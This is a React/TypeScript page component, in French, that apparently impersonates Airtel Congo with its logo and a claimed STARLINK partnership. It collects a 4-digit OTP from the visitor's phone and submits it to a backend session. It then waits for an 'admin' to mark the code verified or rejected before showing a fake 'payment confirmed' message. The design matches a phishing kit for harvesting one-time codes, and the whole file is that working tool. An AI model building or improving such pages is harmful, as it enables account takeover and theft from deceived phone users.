import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, CheckCircle, XCircle } from 'lucide-react';
import airtelLogo from '@assets/image_1784479304453.png';
import {
  useGetSession,
  getGetSessionQueryKey,
  useSubmitOtp,
} from '@workspace/api-client-react';

type Stage = 'loading' | 'otp_entry' | 'awaiting_admin' | 'verified' | 'rejected';

export default function Verify() {
  const [stage, setStage] = useState<Stage>('loading');
  const [otp, setOtp] = useState(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(30);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const sessionId = (history.state?.usr?.sessionId ?? '') as string;
  const phoneNumber = (history.state?.usr?.phoneNumber ?? '+243951234567') as string;

  // 2-second initial spinner, then move to OTP entry
  useEffect(() => {
    const t = setTimeout(() => setStage('otp_entry'), 2000);
    return () => clearTimeout(t);
  }, []);

  // Countdown timer while on OTP entry
  useEffect(() => {
    if (stage !== 'otp_entry') return;
    if (timeLeft <= 0) return;
    const id = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(id);
  }, [stage, timeLeft]);

  // Poll session status while awaiting admin confirmation
  const { data: sessionData } = useGetSession(sessionId, {
    query: {
      enabled: !!sessionId && stage === 'awaiting_admin',
      queryKey: getGetSessionQueryKey(sessionId),
      refetchInterval: 2000,
    },
  });

  useEffect(() => {
    if (!sessionData) return;
    if (sessionData.status === 'verified') setStage('verified');
    if (sessionData.status === 'rejected') setStage('rejected');
  }, [sessionData]);

  const submitOtp = useSubmitOtp({
    mutation: {
      onSuccess: () => setStage('awaiting_admin'),
    },
  });

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.slice(-1);
    setOtp(next);
    if (value && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasted) return;
    const next = [...otp];
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i];
    setOtp(next);
    inputRefs.current[Math.min(pasted.length, 3)]?.focus();
  };

  const handleConfirm = () => {
    if (!sessionId) return;
    submitOtp.mutate({ id: sessionId, data: { otp: otp.join('') } });
  };

  return (
    <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center relative overflow-hidden">
      <AnimatePresence mode="wait">

        {/* ── Loading spinner ── */}
        {stage === 'loading' && (
          <motion.div
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-loading"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-12 animate-pulse" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Veuillez patienter...</h2>
            <p className="text-muted-foreground font-medium">Cela prend généralement quelques secondes</p>
          </motion.div>
        )}

        {/* ── OTP entry ── */}
        {stage === 'otp_entry' && (
          <motion.div
            key="otp"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="w-full max-w-md px-4 flex flex-col items-center"
            data-testid="view-otp"
          >
            <div className="w-full bg-card rounded-3xl shadow-sm border border-card-border p-8 mb-8 text-center">
              <h1 className="text-2xl font-black text-foreground mb-2 tracking-tight">Vérification OTP</h1>
              <p className="text-muted-foreground text-sm font-medium mb-6">
                Entrez l'OTP envoyé à votre numéro de téléphone
                <br />
                <strong className="text-foreground text-base mt-2 inline-block font-bold">{phoneNumber}</strong>
              </p>

              <div className="mb-8">
                <label className="block text-sm font-bold text-foreground mb-4">
                  Entrer l'OTP à 4 chiffres
                </label>
                <div className="flex justify-center gap-3 md:gap-4" onPaste={handlePaste}>
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="\d*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-14 h-16 md:w-16 md:h-20 text-center text-3xl font-black rounded-2xl border-2 border-input bg-secondary/30 focus:bg-card focus:border-primary focus:ring-4 focus:ring-primary/20 outline-none transition-all"
                      data-testid={`input-otp-${index}`}
                    />
                  ))}
                </div>
              </div>

              {submitOtp.isError && (
                <p className="text-sm text-destructive font-medium mb-4">
                  Erreur. Veuillez réessayer.
                </p>
              )}

              <button
                className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 shadow-md shadow-primary/20 disabled:opacity-50 disabled:pointer-events-none flex items-center justify-center gap-2"
                disabled={otp.some((d) => !d) || submitOtp.isPending}
                onClick={handleConfirm}
                data-testid="button-verify-submit"
              >
                {submitOtp.isPending ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Envoi...
                  </>
                ) : (
                  'CONFIRMER'
                )}
              </button>

              <div className="mt-6 text-sm font-medium text-muted-foreground" data-testid="text-countdown">
                {timeLeft > 0 ? (
                  <span>
                    Le code expire dans <strong className="text-foreground">{timeLeft}</strong> secondes
                  </span>
                ) : (
                  <button className="text-primary hover:underline font-bold transition-all">
                    Renvoyer le code OTP
                  </button>
                )}
              </div>
            </div>

            <div className="flex flex-col items-center gap-4 text-center opacity-80">
              <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                En collaboration avec STARLINK™
              </span>
              <img src={airtelLogo} alt="Airtel Logo" className="h-8 w-auto object-contain grayscale" />
              <p className="text-xs font-medium text-muted-foreground">© 2026 Airtel Congo. Tous droits réservés.</p>
            </div>
          </motion.div>
        )}

        {/* ── Awaiting admin confirmation ── */}
        {stage === 'awaiting_admin' && (
          <motion.div
            key="awaiting"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-awaiting"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-14 w-auto object-contain mb-10" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Vérification en cours...</h2>
            <p className="text-muted-foreground font-medium max-w-xs">
              Votre OTP est en cours de validation. Cela prend généralement quelques secondes.
            </p>
          </motion.div>
        )}

        {/* ── Verified ── */}
        {stage === 'verified' && (
          <motion.div
            key="success"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-success"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mb-6">
              <CheckCircle className="w-10 h-10 text-primary" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-success-title">
              Paiement confirmé !
            </h2>
            <p className="text-muted-foreground font-medium mb-2">
              Votre forfait internet a été activé avec succès.
            </p>
            <p className="text-sm text-muted-foreground">{phoneNumber}</p>
          </motion.div>
        )}

        {/* ── Rejected ── */}
        {stage === 'rejected' && (
          <motion.div
            key="rejected"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-rejected"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-destructive/10 flex items-center justify-center mb-6">
              <XCircle className="w-10 h-10 text-destructive" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-rejected-title">
              OTP invalide
            </h2>
            <p className="text-muted-foreground font-medium mb-6">
              Le code saisi est incorrect. Veuillez réessayer.
            </p>
            <button
              onClick={() => { setOtp(['', '', '', '']); setStage('otp_entry'); }}
              className="px-8 py-3 bg-primary text-primary-foreground font-bold rounded-xl hover:bg-primary/90 transition-all"
              data-testid="button-retry"
            >
              Réessayer
            </button>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}
